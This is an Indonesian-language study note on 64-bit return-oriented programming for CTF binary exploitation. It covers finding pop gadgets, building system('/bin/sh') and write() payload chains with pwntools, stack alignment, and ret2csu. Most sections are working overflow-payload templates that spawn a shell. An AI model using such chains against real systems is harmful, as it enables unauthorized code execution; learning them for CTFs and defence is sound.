#cybersecurity

ROP di 64-bit membutuhkan gadget untuk **mengisi register argumen** sebelum memanggil fungsi, karena argumen dikirim lewat register (bukan stack seperti 32-bit).

## Kebutuhan dasar

Untuk memanggil fungsi dengan N argumen, butuh gadget `pop` per argumen:

```asm
pop rdi ; ret    ; argumen ke-1
pop rsi ; ret    ; argumen ke-2
pop rdx ; ret    ; argumen ke-3
pop rcx ; ret    ; argumen ke-4
```

## Mencari gadget

```bash
ROPgadget --binary chall | grep "pop rdi"
# 0x00000000004013b3 : pop rdi ; ret

ROPgadget --binary chall | grep "pop rsi"
ROPgadget --binary chall | grep "pop rdx"
```

Dari pwntools:

```python
from pwn import *
elf = ELF("./chall")
rop = ROP(elf)
pop_rdi = rop.find_gadget(["pop rdi", "ret"]).address
```

## Contoh: system("/bin/sh")

```python
payload  = b"A" * offset
payload += p64(pop_rdi)          # pop nilai berikut ke RDI
payload += p64(binsh)            # "/bin/sh"
payload += p64(system)           # lompat ke system
```

## Contoh: write(1, buf, n) - 3 argumen

```python
payload  = b"A" * offset
payload += p64(pop_rdi) + p64(1)          # fd = 1 (stdout)
payload += p64(pop_rsi) + p64(buf)        # buf
payload += p64(pop_rdx) + p64(n)          # n
payload += p64(write_addr)                # write
```

## Alignment 16-byte

Di 64-bit, stack harus **16-byte aligned** saat `call` (fungsi seperti system memakai `movaps`). Kalau crash aneh:

```python
ret = 0x40101a   # gadget `ret` saja (biasanya di _start / __libc_csu_init)

payload = b"A"*offset + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system)
```

`ret` tambahan menggeser stack 8 byte → alignment benar. Detail: [[Calling Convention]].

## Tidak ada gadget pop rdi? → ret2csu

Binary tanpa gadget sederhana (jarang di CTF modern, tapi ada): pakai gadget di `__libc_csu_init` yang bisa memanggil fungsi dengan 3 register:

```bash
objdump -d chall | grep -A20 "__libc_csu_init"
```

Ada dua blok:

```asm
pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
mov rdx, r15 ; mov rsi, r14 ; mov edi, r13d ; call [r12+rbx*8] ; ...
```

pwntools otomatis: `rop.call(func, [args...])` akan memakai ret2csu kalau perlu.

## Memakai pwntools (paling mudah)

```python
rop = ROP(elf)
rop.system(binsh)                 # otomatis cari gadget pop rdi
rop.call("write", [1, buf, 8])    # multi-arg otomatis
payload = b"A"*offset + rop.chain()
```

## Ringkasan bentuk chain

```
[pop rdi; ret] [arg1] [pop rsi; ret] [arg2] [pop rdx; ret] [arg3] [func]
```

Aturan: **setiap argumen = satu gadget pop + nilainya**, diakhiri alamat fungsi.

## Catatan

1. Urutan gadget harus sesuai urutan argumen (RDI dulu, lalu RSI, lalu RDX).
2. Kalau fungsi butuh 4+ argumen, argumen ke-4 (`RCX`) kadang tidak penting → cari gadget `pop rcx` atau `mov rcx, ...; ret`.
3. `call [r12+rbx*8]` di ret2csu bisa memanggil fungsi apapun - ini fallback universal.
4. Selalu cek dengan `ROPgadget` atau `ropper` kalau pwntools gagal menemukan gadget.
